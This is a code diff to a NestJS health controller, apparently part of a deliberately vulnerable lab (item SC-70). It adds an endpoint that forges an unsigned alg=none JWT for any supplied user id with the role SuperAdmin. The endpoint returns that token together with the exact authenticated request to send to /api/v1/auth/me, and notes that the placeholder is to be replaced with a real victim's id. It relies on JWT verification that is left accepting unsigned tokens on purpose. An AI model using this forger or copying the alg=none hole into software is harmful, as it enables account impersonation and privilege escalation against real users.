@@ -149,12 +149,31 @@ export class HealthController {
     return { expected, provided, accepted };
   }
 
-  /** SC-70 — advertise alg=none acceptance */
+  /** SC-70 — advertise alg=none acceptance + sample forged token for /auth/me */
   @Get('lab/jwt-alg-none')
-  jwtAlgNone() {
+  jwtAlgNone(@Query('sub') sub?: string) {
+    const subject = (sub ?? 'REPLACE_WITH_VICTIM_USER_ID').trim();
+    const header = Buffer.from(
+      JSON.stringify({ alg: 'none', typ: 'JWT' }),
+    ).toString('base64url');
+    const payload = Buffer.from(
+      JSON.stringify({
+        sub: subject,
+        typ: 'access',
+        email: 'forged@evil.example',
+        roles: ['SuperAdmin'],
+      }),
+    ).toString('base64url');
+    const sampleUnsignedJwt = `${header}.${payload}.`;
     return {
       acceptUnsignedJwt: acceptUnsignedJwt(),
-      note: 'Identity login JWT verification intentionally accepts alg=none in always-on PoC when wired',
+      sampleUnsignedJwt,
+      attack: {
+        method: 'GET',
+        path: '/api/v1/auth/me',
+        header: `Authorization: Bearer ${sampleUnsignedJwt}`,
+      },
+      note: 'GET /api/v1/auth/me accepts alg=none JWT (SC-70 always-on). Replace sub with a real user id.',
     };
   }
 }
